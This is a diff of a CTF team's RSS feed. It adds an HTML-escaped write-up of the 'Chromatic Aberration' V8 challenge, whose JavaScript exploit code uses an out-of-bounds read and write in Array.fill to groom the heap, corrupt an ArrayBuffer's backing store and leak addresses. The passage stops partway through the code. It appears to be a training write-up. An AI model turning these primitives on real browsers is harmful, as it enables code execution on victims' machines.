+&lt;p&gt;It was 4:40 am and we were very sleepy. It took us few minutes to figure out that &lt;code&gt;rcx&lt;/code&gt; isn&#39;t composed of 16 hexchars. The correct flag should be &lt;code&gt;p4{62246322232ceabf0bf1d9826c054007}&lt;/code&gt; (note that there is an &lt;em&gt;zero&lt;/em&gt;). Yeah, :checkered_flag: - and we are the first to capture this!&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -28,7 +704,108 @@ Challenge Summary  We wanted to plant a lot of trees, but it&#39;s going kinda s
       <pubDate>Wed, 01 Jul 2020 15:30:00 +0800</pubDate>
       
       <guid>https://b6a.black/posts/2020-07-01-confidencectf-teaser-chromatic/</guid>
-      <description>In this CTF Question, author introduced a OOB read and arbitary write to the Array.fill of the V8 engine. So, our exploitation will be very straightforward. First, we will set up an array of BitInts with 0x33313131 as marking for arbitary write after we collect sufficient primitive with the OOB.</description>
+      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Chromatic Aberration
+Points: 182
+Solves: 20
+Pwn our chrome for fun and profit.
+
+Ok, it&amp;#39;s not really Chrome, but it&amp;#39;s close enough.
+
+Let&amp;#39;s say, it&amp;#39;s chromatic
+
+The memory limit is 64MB
+
+nc chromatic-aberration.zajebistyc.tf 31004
+6d87044f837a59e649f6d799143aede299a3103e764f8c46c921c3ee16da773a_chromatic_aberration.tar 103M
+For people having problems with the above link, try this ones
+
+6d87044f837a59e649f6d799143aede299a3103e764f8c46c921c3ee16da773a_chromatic_aberration.tar 103M
+6d87044f837a59e649f6d799143aede299a3103e764f8c46c921c3ee16da773a_chromatic_aberration.tar 103M
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this CTF Question, author introduced a OOB read and arbitary write to the &lt;code&gt;Array.fill&lt;/code&gt; of the V8 engine. So, our exploitation will be very straightforward. First, we will set up an array of &lt;code&gt;BitInt&lt;/code&gt;s with &lt;code&gt;0x33313131&lt;/code&gt; as marking for arbitary write after we collect sufficient primitive with the OOB.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tarr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BigUint64Array&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;);
+&lt;span style=&#34;color:#a6e22e&#34;&gt;tarr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x33313131&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;tarr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32323232&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then, we will setup an array of &lt;code&gt;ArrayBuffer&lt;/code&gt; and trigger garbage collection to move all of this items to the oldspace. As mentioned in the doc of GC, its expected to trigger in anytime, this step can ensure the address leaked will be constant throughout the exploitation. This is essential for locating relative information and escalate to code execution (there is a better way for this chall though).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ab&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x200&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;ab&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1337&lt;/span&gt;));
+}
+&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AAAAAAAA&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BBBBBBBB&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CCCCCCCC&amp;#39;&lt;/span&gt;]
+&lt;span style=&#34;color:#a6e22e&#34;&gt;gc&lt;/span&gt;();
+&lt;span style=&#34;color:#a6e22e&#34;&gt;gc&lt;/span&gt;();
+&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[+] Locate relative postion of tarr&amp;#39;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We use the OOB read primitive to locate the relative position of &lt;code&gt;tarr&lt;/code&gt; from &lt;code&gt;oob_str_arr&lt;/code&gt; and locate one of the &lt;code&gt;ArrayBuffer&lt;/code&gt;s:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tarr_ix&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4000&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; 
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)  &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)  &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)  &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x31&lt;/span&gt;) {
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;tarr_ix&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;;
+    }
+}
+&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;tarr_ix&lt;/span&gt;);
+&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[+] Locate array buffer&amp;#39;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ab_ix&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4000&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)  &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x37&lt;/span&gt;) {
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;ab_ix&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The above code used the memory layout as a feature for locating the &lt;code&gt;ArrayBuffer&lt;/code&gt; from the memory:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-01-confidencectf/1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Originally, we fetch the difference dynamically, but it turns out that this way not quite stable, so we just hardcode it with 650 (found base on experiment).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 650 is the threshold calculate from running the code in debugger
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// weird
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;diff&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;650&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// tarr_ix-ab_ix;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[+] Difference : &amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;diff&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next, we will corrupt the size of the &lt;code&gt;ArrayBuffer&lt;/code&gt; we obtained and get it back:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;tarr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;fill&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4000&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;,Math.&lt;span style=&#34;color:#a6e22e&#34;&gt;floor&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;diff&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,Math.&lt;span style=&#34;color:#a6e22e&#34;&gt;floor&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;diff&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;));
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;corrupted_ix&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[+] Now we corrupted one of the array size :)&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x200&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;ab&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;byteLength&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1337&lt;/span&gt;) {
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;corrupted_ix&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Our exploitation technique is simple, we will corrupt the backing store of the &lt;code&gt;ArrayBuffer&lt;/code&gt; and point it to anywhere in the memory.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-01-confidencectf/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;However, from the deployed pointer compression&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;, we cannot leak address directly. We will need to leak the upper part of the address instead. While scanning the memory, we found the upper part of the address:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-01-confidencectf/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The 0x0000007 pattern exist constantly throughout runtime, so we use the below code to scan the memory in order to retrieve the upper part of the address:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;up_byte&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lo_byte&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
